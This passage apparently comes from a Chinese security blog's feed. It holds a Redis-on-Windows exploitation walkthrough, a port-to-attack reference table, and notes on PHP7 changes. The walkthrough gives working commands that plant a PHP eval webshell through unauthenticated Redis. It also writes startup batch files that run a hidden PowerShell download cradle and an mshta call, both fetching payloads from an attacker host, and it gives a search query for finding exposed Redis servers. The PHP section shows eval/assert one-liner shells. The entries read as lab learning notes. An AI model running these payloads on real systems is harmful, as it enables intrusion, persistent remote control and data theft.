href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></p><p>Fofa 关键字搜索<br>port=”6379” &amp;&amp; protocol==redis &amp;&amp; country=CN<br>对Web 网站的真实ip 进行全端口扫描 / 探测 redis</p><hr><h1 id="Windows下Redis-利用思路"><a href="#Windows下Redis-利用思路" class="headerlink" title="Windows下Redis 利用思路"></a>Windows下Redis 利用思路</h1><p>学了两天的Cobalt Strike 4.0 的基础使用和术语，继续把之前漏掉的Windows 下利用Redis 学习总结一下。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太难了，Windows Server 2008 R2 我这里(VMware Fusion)没法用VMware Tools，Github（图片上github URL打错了） 又不能访问，机器上也没有Github。我是如何把Windows 版的Redis 弄上去的？哈哈（其实后面想了想还有其他办法，不过感觉也有点麻烦。</p><p><img src="https://i.imgur.com/KRBRvS9.png"></p><p><img src="https://i.imgur.com/39WhmIK.png"></p><p>因为之前复现 MS17-010，CVE-2019-0708，开启了445 和 3389 。我这里用ms17-010 打过去，拿到了system 权限<br>用Cobalt Strike 生成上线 64 位的exe 可执行文件上线木马<br>MSF 上传木马并执行<br>Cobalt Strike 上2008 R2 成功 上线<br>然后也不能传目录（可以传压缩包，终于懂了为什么有些东西不能传文件夹了），但是相比用msf，这里可视化上传也是很不错了。<br><img src="https://i.imgur.com/HMYcnTZ.png"></p><p><img src="https://i.imgur.com/A41ZMox.png"></p><p>算是第一次同时使用Metasploit 和 Cobalt Strike。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Redis-Server：Windows Server 2008 R2 x64<br>Attacker：Kali Linux<br>网络：NAT<br>IP：192.168.118.134，192.168.118.129<br>PhpStudy 2018 搭建 Web 服务,需要相关vc运行库<br>切换到对应的目录下，redi-server.exe redis.conf 即可启动redis-server 服务。<br><img src="https://i.imgur.com/U6Z4tkr.png"></p><p>netstat -ano 查看端口开放情况<br><img src="https://i.imgur.com/UANrinf.png"></p><p>可以看到，已经开启了 6379 Redis 服务。</p><p>尝试连接一下<br><img src="https://i.imgur.com/n9gYmuj.png"></p><p>ping 返回 PONG。成功远程未授权连接上Redis。（相比与Linux下复现，这里我没有修改任何redis.conf的内容，难道是说Windows下默认可以。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>相比于Linux 下攻击Redis 未授权，Windows 下又有哪些可以利用的？Linux 下可以写入Webshell，Windows 下肯定也行。Linux 下可以写入SSH，导致SSH 远程登录目标机器，而Windows没有。</p><h3 id="写入Webshell"><a href="#写入Webshell" class="headerlink" title="写入Webshell"></a>写入Webshell</h3><p>这种方法最容易想到，也相对来说有点鸡肋，因为必须要知道Windows 下搭建的Web 服务的网站物理路径，才能往里面写webshell，当然也可以猜测，或者专门去收集一些常见的网站物理路径位置。(这次我发现用PHPStudy2018 安装默认存在一个phpinfo.php，以及phpMyadmin)</p><p><img src="https://i.imgur.com/ydL4RPh.png"></p><p>不一会儿，有一个师傅走过来，问我在干嘛，我说在学打Redis…… 他说，你怎么又在打Redis。。。然后就讨论了一下(大概说了有五分钟左右，这里就说下讨论的结论），假设Windows 服务器下的Redis 肯定在内网，6379不出网，然后如果存在SSRF的点，那么用gopher 协议可能可以打一波 SSRF 攻击内网未授权，写入webshell，或者反弹shell啥的。但是，如何打入内网的问题似乎才是利用的关键，而我总结的这些感觉都是已经在内网了或者是拿到了一个未授权的访问了，如果没有SSRF似乎就没有办法了(就单独说从这一台机器。我想到一种，就是RCE修改redis.conf,然后让6379 暴露公网，然后做一个隐藏后门，感觉应该可以这样利用。当然，已经有RCE，那么肯定第一件是就是拿shell了，所以这个思路我觉得只能说是在后面权限持续控制的时候，当作一种思路罢了（感觉具体实现性的话也不是很行。晚上我又想到，可不可以利用信息泄漏，比如说内网ip信息泄漏啥的，来进入内网？其他方法，可以以后有想法了，再来研究研究。</p><p>得到物理路径：C:/Users/Administrator/Desktop/PHPTutorial/WWW</p><p>然后就和Linux 下写Webshell 差不多了，只是换了一下dir 路径，和换行符的区别，因为Windows 和 Linux 的换行符是不一样的。这里是Windows，所以是\r\n（也是一样，避免和原始数据混淆）</p><p>192.168.118.134:6379&gt; config set dir C:/Users/Administrator/Desktop/PHPTutorial/WWW<br>OK<br>192.168.118.134:6379&gt; set webshell “\r\n<?php @eval($_POST[a]);?>\r\n”<br>OK<br>192.168.118.134:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.134:6379&gt; save<br>OK<br><img src="https://i.imgur.com/AxEyXv7.png"></p><p>还发现了，这些操作，似乎都会被记录进redis 日志的。</p><p><img src="https://i.imgur.com/guAkaO1.png"></p><p>当然，使用shell 管理器，比如蚁剑是肯定能连上的。</p><p>查看一下webshell.php<br>Redis 写文件会自动写入一行版本信息。然后再是我们写的东西。</p><p><img src="https://i.imgur.com/BhlKVPY.png"></p><p>说明了之前在学习Linux下利用redis写webshell的时候，其实不用flushall 也可以写webshell的，在新的一个dbfile 里面写入就行了。</p><h3 id="写入启动项"><a href="#写入启动项" class="headerlink" title="写入启动项"></a>写入启动项</h3><p>“用户启动文件夹”和“系统启动文件夹”的区别：</p><p>1、两者启动文件夹的路径不一样。用户开机启动文件夹，对应“开始菜单”-“程序”-“启动”功能，路径是：“C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”；系统启动文件夹对应的路径是：“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”。</p><p>2、两者起到的功能不一样。举例说明：如果系统有admin和guest两个系统用户，admin使用方法一（用户启动文件夹）添加开机启动项，那么只有使用admin登录系统时，开机启动项才会起作用，guest用户登录系统不会自动启动；而使用方法二（系统启动文件夹）设置的开机启动项，在admin和guest登录系统时都会启动。</p><p>写入启动项，大概有三种攻击路线，利用msf，CS，还有一个就是PS_Shell.rb 来上线。</p><p>利用Cobalt Strike<br>当然也可以用 Metasploit。</p><blockquote><p>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery，选择Powershell</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.118.129:80&#x2F;aaa&#39;))&quot;</span><br></pre></td></tr></table></figure><p>然后和写入Webshell 一样的方式，将上面的payload 保存为.bat文件。这里因为payload里面有双引号，所以需要进行转义。</p><p>bat（批处理）文件概念：在DOS和Windows 9x 操作系统家族中，批处理文件的文件扩展名为.bat。当运行批处理文件时，通常是cmd.exe，会读取文件中的内容，并逐行运行。</p><p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename config.bat<br>OK<br>192.168.118.146:6379&gt; set shell_bat “\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.118.129/aaa&#39;))\&quot;\r\n\r\n&quot;">http://192.168.118.129:80/aaa&#39;))\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启靶机。。可以发现主机上线了。（这里我中途去吃饭了，然后回来又看了一下关于SRC相关的东西，所以时间上看起来上线很晚，实际上，等开机之后过一会儿就上线了，可能这取决于目标系统的流畅度</p><p><img src="https://i.imgur.com/QDxyT31.png"></p><p>查看开机启动项<br><img src="https://i.imgur.com/TY3qpOp.png"></p><p>确实成功写入，并且执行了。</p><h3 id="利用mshta-PS-shell"><a href="#利用mshta-PS-shell" class="headerlink" title="利用mshta PS_shell"></a>利用mshta PS_shell</h3><p>利用的exploit：<a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb">https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb</a></p><p>在/usr/share/metasploit-framework/modules/exploits/windows下创建一个PS_shell.rb文件，将上面的内容填入进去。进入msfconsole 然后重新载入一下exploit，reload_all。</p><p><img src="https://i.imgur.com/ugzwH85.png"></p><p>然后运行mshta.exe “……” 就可以反弹shell了。</p><p>这里就可以利用redis 未授权，写入启动项来运行，从而得到反弹shell。</p><p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename backup.bat<br>OK<br>192.168.118.146:6379&gt; set backup “\r\n\r\n mshta.exe &quot;<a href="http://192.168.118.129:8080/tql/&quot;/r/n/r/n&quot;">http://192.168.118.129:8080/tql\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启目标机器。。不过每次重启之后，还要切换成Administrator账户，才会收到session或者说上线。<br><img src="https://i.imgur.com/ZY8Ae2n.png"></p><p><img src="https://i.imgur.com/VV6WV5W.png"></p><p>关于 mshta.exe的科普：<a href="https://baike.baidu.com/item/Mshta.exe/10666591">https://baike.baidu.com/item/Mshta.exe/10666591</a></p><p><a href="http://jincheng.xpcha.com/675nabeltqm/">http://jincheng.xpcha.com/675nabeltqm/</a></p><p>英文全称Microsoft HTML Application，可用于执行.HTA 文件，是微软超文本标记语言应用。</p><p>而在之前那个PS_Shell.rb 的源码中，利用的是 CVE-2017-11882，其中有一段注释</p><p>This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc.</p><p>漏洞分析：<a href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a> 漏洞类型：栈溢出漏洞导致内存损坏</p><h3 id="写入MOF"><a href="#写入MOF" class="headerlink" title="写入MOF"></a>写入MOF</h3><p>环境必须为Windows 2003，比较久远的提权方法。这里不复现了，了解一下吧。如果有机会会用到，至少要知道。<br>mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p>也就是说在c:/windows/system32/wbem/mof/目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。</p><p>这种利用方式不用重启目标机器，也不需要获取目标Web的物理路径，只是环境必须是Windows 2003</p><h3 id="DLL-劫持"><a href="#DLL-劫持" class="headerlink" title="DLL 劫持"></a>DLL 劫持</h3><p>这种利用方法和下面的快捷方式覆写请参考R3start大佬的文章：<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a></p><h3 id="快捷方式覆写"><a href="#快捷方式覆写" class="headerlink" title="快捷方式覆写"></a>快捷方式覆写</h3><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>参考上面的漏洞修复</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Windows下的利用思路，其实前两张和Linux下是一样的。甚至比Linux 下还鸡肋，毕竟Linux 下的web 目录是可以猜测的（就那么几个。写入MOF，前几天在先知社区也有人发了文章了，<a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a></p><p>DLL 劫持 和 快捷方式覆写领会思路和原理吧，不想复现了，最近事情太多了。（埋坑。</p><p>另外，Linux 下还有如下利用方法：</p><p>写入到/etc/profile.d/用户环境变量<br>开启AOF持久化纯文本记录appendfilename<br>这里，就先不研究了，感觉目前用不到，了解一下就行了。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p><p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> Redis 在Windows 下 如何Getshell</p><p><a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a> Redis Windows 踩坑</p><p>换行符：<a href="https://blog.csdn.net/CJF_iceKing/article/details/47836201">https://blog.csdn.net/CJF_iceKing/article/details/47836201</a></p><p>Windows 开机启动项：<a href="http://www.win10xiazai.com/win10/5334.html">http://www.win10xiazai.com/win10/5334.html</a></p><p>GetShell ：<a href="https://cloud.tencent.com/developer/article/1488184">https://cloud.tencent.com/developer/article/1488184</a></p><p>MOF提权：</p><p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a><br><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/</a><br>DLL劫持&amp;&amp;INK 覆写 来利用redis：<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a> ，工具也是这位师傅写的，感觉好强。</p><p>DLL 劫持参考：</p><p><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近放出来的文章都是以前早就总结好的了。&lt;/p&gt;
&lt;h1 id=&quot;Redis-安全学习笔记&quot;&gt;&lt;a href=&quot;#Redis-安全学习笔记&quot; class=&quot;headerlink&quot; title=&quot;Redis 安全学习笔记&quot;&gt;&lt;/a&gt;Redis 安全学习笔记&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Redis" scheme="https://hack-for.fun/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>常见端口服务漏洞</title>
    <link href="https://hack-for.fun/e42fccb.html"/>
    <id>https://hack-for.fun/e42fccb.html</id>
    <published>2020-08-25T16:27:28.000Z</published>
    <updated>2020-08-26T01:59:43.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列举"><a href="#列举" class="headerlink" title="列举"></a>列举</h1><p>21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门<br>22    ssh远程连接    爆破/openssh漏洞<br>23    Telnet远程连接    爆破/嗅探/弱口令<br>25    SMTP邮件服务    邮件伪造<br>53    DNS域名解析系统    域传送/劫持/缓存投毒/欺骗<br>81    Ipcam    登陆绕过/远程代码执行<br>110    pop3    爆破/嗅探<br>139    Samba服务    爆破/未授权访问/远程命令执行<br>143    Imap协议    爆破<br>389    Ldap目录访问协议    注入/未授权访问/弱口令<br>445    smb    ms17-010/端口溢出<br>873    Rsync服务    文件上传/未授权访问<br>1080    socket    爆破<br>1352    Lotus      domino邮件服务    爆破/信息泄漏<br>1433    mssql    爆破/注入/SA弱口令<br>1521    oracle    爆破/注入/TNS爆破/反弹shell<br>2049    Nfs服务    配置不当<br>2181    zookeeper服务    未授权访问<br>2375    docker      remote      api    未授权访问<br>3306    mysql    爆破/注入<br>3389    Rdp远程桌面链接    爆破/shift后门<br>4440    rundeck    弱口令admin<br>4848    GlassFish控制台    爆破/认证绕过<br>5000    sybase/DB2数据库    爆破/注入/提权<br>5432    postgresql    爆破/注入/缓冲区溢出<br>5632    pcanywhere服务    抓密码/代码执行<br>5900    vnc    爆破/认证绕过<br>6082    varnish    Varnish      HTTP      accelerator      CLI      未授权访问<br>6379    Redis数据库    未授权访问/爆破<br>67/68    dhcp服务    劫持/欺骗<br>8082    H2数据库    弱口令/空口令<br>8161    activemq    弱口令/写文件<br>8649    ganglia    信息泄漏<br>9000    fastcgi    远程命令执行<br>9090    Websphere控制台/用友    爆破/java反序列化/弱口令<br>11211    memcached    未授权访问<br>50000    SAP    SAP命令执行<br>80/443    http/https    web应用漏洞/心脏滴血<br>161：162    SNMP协议    爆破/搜集目标内网信息<br>2601:2604    zebra路由软件    默认密码zebra<br>3128：3312    squid    远程代码执行<br>7001/7002    weblogic    java反序列化/控制台弱口令<br>8083/8086    influxDB    未授权访问<br>9200/9300    elasticsearch    远程代码执行<br>512/513/514    Linux      Rexec服务    爆破/Rlogin登陆<br>61616/8161    ActiveMQ    未授权访问/默认密码/反序列化<br>8069/10050    zabbix服务    远程命令执行/注入<br>8000/8080/8089    Jboss/Tomcat/Resin    爆破/PUT文件上传/反序列化<br>27017/27018/28017    mongodb    未授权访问/爆破<br>8080/8088/50060:50070    hadoop    默认端口未授权访问</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>等我有空，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;列举&quot;&gt;&lt;a href=&quot;#列举&quot; class=&quot;headerlink&quot; title=&quot;列举&quot;&gt;&lt;/a&gt;列举&lt;/h1&gt;&lt;p&gt;21    ftp/tftp/vsftpd文件传输协议    爆破/嗅探/溢出/后门&lt;br&gt;22    ssh远程连接    爆破/open</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="端口" scheme="https://hack-for.fun/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>PHP以及MYSQL相关版本差异及对应的安全问</title>
    <link href="https://hack-for.fun/d8714939.html"/>
    <id>https://hack-for.fun/d8714939.html</id>
    <published>2020-08-25T15:53:12.000Z</published>
    <updated>2020-08-26T01:49:08.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，漏洞利用方式的不同，于是有了这篇文章。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>PHP 现在应该一般都升级为<strong>php7</strong>了吧，所以来学习一波php7的新特性。</p><p>主要是参考这篇文章：<a href="http://www.php7.site/book/php7/variable-changes-22.html#0">http://www.php7.site/book/php7/variable-changes-22.html#0</a></p><h2 id="变量处理机制"><a href="#变量处理机制" class="headerlink" title="变量处理机制"></a>变量处理机制</h2><ul><li>间接变量，属性和方法引用都按照 <strong>从作到右</strong>到顺序进行解释（如果想要改变顺序，可以使用大括号</li><li>global 关键字只能引用简单变量</li><li>无法将一个函数作为另一个函数的参数进行传递</li><li>引用赋值时自动创建数组元素或者对象属性顺序不同</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array = [];</span><br><span class="line">$array[<span class="string">&quot;a&quot;</span>] =&amp; $array[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">$array[<span class="string">&quot;b&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">PHP7产生的数组：[<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>]</span><br><span class="line">PHP5产生的数组：[<span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h2><ul><li><code>list()</code> 按照顺序进行取值。</li><li>对一个空的list()赋值不再允许</li><li>list() 不再具有拆分功能</li></ul><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h2><ul><li>foreach循环对数组内部指针不再起作用</li><li>foreach进行by-value循环时，是对该数组的拷贝操作，如果对其进行修改也没有影响</li><li>按照引用进行循环时，对数组进行修改就会有影响</li></ul><h2 id="参数处理机制"><a href="#参数处理机制" class="headerlink" title="参数处理机制"></a>参数处理机制</h2><ul><li>不再支持重复参数名（也没人这样用</li><li>Func_get_arg 和 func_get_args，这两个方法返回参数当前的值，而不是传入时的值</li><li>PHP7 报错的时候，也是报当前值</li></ul><h2 id="整数处理机制修改"><a href="#整数处理机制修改" class="headerlink" title="整数处理机制修改"></a>整数处理机制修改</h2><ul><li>无效的8进制数会编译报错，而老版本会忽略无效的数字</li><li>位移负的位置会产生异常 ArithmeticError: Bit shift by negative number</li><li>左位移如果超出位数返回 <code>0</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">1</span> &lt;&lt; <span class="number">64</span>);</span><br></pre></td></tr></table></figure><ul><li>右移如果超出位数返沪0或-1</li></ul><h2 id="字符串处理机制修改"><a href="#字符串处理机制修改" class="headerlink" title="字符串处理机制修改"></a>字符串处理机制修改</h2><ul><li>含有16进制的字符串不再视为数字，也不区别对待。这个就会涉及到一些绕过了。</li><li><code>\u&#123;</code> 后面如果包含非法字符会报错</li></ul><h2 id="其他修改"><a href="#其他修改" class="headerlink" title="其他修改"></a>其他修改</h2><ul><li>CURL模块：禁止禁用CURLOPT_SAFE_UPLOAD选项，通过curl上传文件必须使用curl_file/CURLFILE接口。</li><li>DATE模块：mktime()和gmmktime()函数移除了$is_dst parameter参数。</li><li>DBA模块：dba_delete() 如果在inifile里面没有找到key的时候会返回false。</li><li>GMP模块：必须用libgmp 4.2版本以上。gmp_setbit() and gmp_clrbit()如果传入的index为负数的话，会返回false。</li><li>Intl模块：移除了别名函数datefmt_set_timezone_id() 和IntlDateFormatter::setTimeZoneID()，用datefmt_set_timezone() 和IntlDateFormatter::setTimeZone()</li><li><strong>libxml模块：新增ibxml 2.9.0引入的LIBXML_BIGLINES 选项，并在错误报告中增加了行号&gt; 16-bit的支持。</strong></li><li>Mcrypt模块：.移除了mcrypt_generic_end() mcrypt_ecb(), mcrypt_cbc(), mcrypt_cfb() 和mcrypt_ofb()</li><li>Opcache：移除了opcache.load_comments配置项，现在注释加载总是被激活的。</li><li>OpenSSL：移除了”rsa_key_size”、”CN_match” 、”SNI_server_name” 选项。</li><li><strong>PCRE：移除了 /e (PREG_REPLACE_EVAL) 修饰符的支持，使用preg_replace_callback()来代替。</strong></li><li>PDO_pgsql：删除了PGSQL_ATTR_DISABLE_NATIVE_PREPARED_STATEMENT选项。</li><li>Standard：删除了setlocale()函数里面对字符串类型的支持，使用LC_*常量。删除了set_magic_quotes_runtime() magic_quotes_runtime().</li><li>JSON：json_decode()会拒绝与RFC 7159不兼容的数字格式。json_decode第一个参数是空值的时候会返回json语法错误。</li><li>Stream：删除别名函数set_socket_blocking()</li><li>XSL：删除xsl.security_prefs 选项。</li><li>session<ul><li>session_start()可以接受所有的INI设置，可以用数组的方式传入，比如：[‘cache_limiter’=&gt;’private’]</li><li>save handler接受validate_sid(), update_timestamp() ，可用来检查sid是否存在，更新session数据的时间戳。</li><li>增加了SessionUpdateTimestampHandlerInterface，这个接口里面定义了validateSid(), updateTimestamp()方法。</li><li>session.lazy_write(default=On) 配置项可以允许只有session数据有变化时才写数据。</li></ul></li></ul><p>。。。。。。</p><p>以及其他特性。</p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><a href="https://www.cc1021.com/article/134.html">https://www.cc1021.com/article/134.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>Eval 把其中的字符串当做PHP代码进行执行。所有语句必须以分号结束。</p><blockquote><p>函数*<em>eval()**语言结构是 <em>非常危险\</em>的， 因为它允许执行任意 PHP 代码。 \</em>它这样用是很危险的。* 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，<em>不要允许传入任何由用户 提供的、未经完整验证过的数据</em> 。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">    $_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 传入：1=assert&amp;2=system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">  <span class="comment">// short_open_tag=On</span></span><br></pre></td></tr></table></figure><p>eval 是一个语言构造器，而不是一个函数。不能被可变 函数调用。</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>检查一个断言是否为FALSE。</p><p>PHP 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="keyword">string</span> $description ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>PHP 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">Throwable</span> $exception ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>如果<code>assertion</code> 为字符串，那么会被当做php 代码来执行。<strong>在PHP 7 中，变为语言结构而不是函数，即不能像eval那样支持可变函数了。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]); <span class="comment">// 在php7 中无法使用1=assert&amp;2=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>eval其实是Zend引擎到函数，而assert是PHP_FUNCTION 宏编写的，调用不同。</p><p><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a></p><p><a href="https://www.anquanke.com/post/id/173201">https://www.anquanke.com/post/id/173201</a></p><h3 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h3><h4 id="Php-7-0-7-3-bypass"><a href="#Php-7-0-7-3-bypass" class="headerlink" title="Php 7.0-7.3 bypass"></a>Php 7.0-7.3 bypass</h4><p>:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 